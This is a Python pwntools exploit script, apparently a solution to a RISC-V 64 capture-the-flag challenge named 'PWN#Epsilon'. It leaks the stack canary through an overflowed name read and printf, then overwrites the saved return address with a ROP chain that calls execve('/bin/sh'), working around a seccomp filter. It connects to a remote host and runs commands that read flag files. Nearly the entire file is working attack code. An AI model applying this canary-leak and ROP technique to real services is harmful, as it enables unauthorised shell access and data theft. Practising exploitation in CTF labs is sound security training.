#!/usr/bin/env python3
# PWN#Epsilon (RISC-V 64, static, No PIE, canary) — execve("/bin/sh",0,0) via ROP.
# system()/do_system() don't spawn (seccomp blocks fork/clone) -> execve syscall.
#
# vuln@0x10608: buf=sp+8, canary=buf+64, saved s0=buf+72, saved ra=buf+80,
#               message read=200 bytes, entry sp=buf+88.
# Canary leaked via name read (65 bytes overwrites canary byte0) + printf("Hello,%s").
#
# Chain (all gadgets verified; a0=/bin/sh delivery confirmed on remote):
#   s0 = /bin/sh         (set via saved-s0 slot; preserved by the two gadgets below)
#   g_a7 0x1475e: a6=[sp+8]; a7=[sp+0x10]=221; ra=[sp+0x38]; sd a0,0x20(a6); a0=a7; sp+=0x40
#   g_a5 0x15820: a5=[sp+8]=0x102dc(ecall); ra=[sp+0x18]; (clobbers a0); sp+=0x20
#   fin  0x18574: a2=0; a1=0; a0=s0=/bin/sh; jalr a5(=ecall)  -> execve("/bin/sh",0,0), a7=221
import sys
from pwn import *

context.arch='riscv64'; context.endian='little'; context.log_level='info'

BINSH = 0x52ab8
G_A7  = 0x1475e
G_A5  = 0x15820
FIN   = 0x18574
ECALL = 0x102dc
WRIT  = 0x80000          # writable, non-RELRO (RW seg 0x7f000..0x85e08), for sd a0,0x20(a6)

io = remote('169.58.126.107', 5003) if '--remote' in sys.argv else process(['qemu-riscv64','./vault'])

io.recvuntil(b'Enter your name: ')
io.send(b'A'*64 + b'B')
io.recvuntil(b'Hello, ')
canary = b'\x00' + io.recvn(72)[65:72]
log.info('canary = %#x', u64(canary))

buf = bytearray(b'\x90'*184)
def put(o, v): buf[o:o+8] = p64(v) if isinstance(v, int) else v
for i in range(0,64,8): put(i, b'A'*8)
put(64, canary)          # canary
put(72, BINSH)           # saved s0 -> s0 = /bin/sh
put(80, G_A7)            # saved ra -> g_a7      (entry sp=buf+88)
put(96, WRIT)            # g_a7 a6 = [sp+8]
put(104, 221)            # g_a7 a7 = [sp+0x10]
put(144, G_A5)           # g_a7 ra = [sp+0x38]
# g_a5 entry sp=buf+152: a5=[sp+8]=buf+160, ra=[sp+0x18]=buf+176
put(160, ECALL)          # g_a5 a5 = ecall (g_a5 entry sp=buf+152)
put(176, FIN)            # g_a5 ra -> 0x18574
# fin entry sp=buf+184: a2=0,a1=0,a0=s0=binsh, jalr a5=ecall

io.recvuntil(b'vault keeper: ')
io.send(bytes(buf))
io.recvuntil(b'Message received.')
io.sendline(b'id; echo GOTSHELL; ls -la /; cat /flag* /flag/* /home/*/flag* 2>/dev/null')
io.interactive()
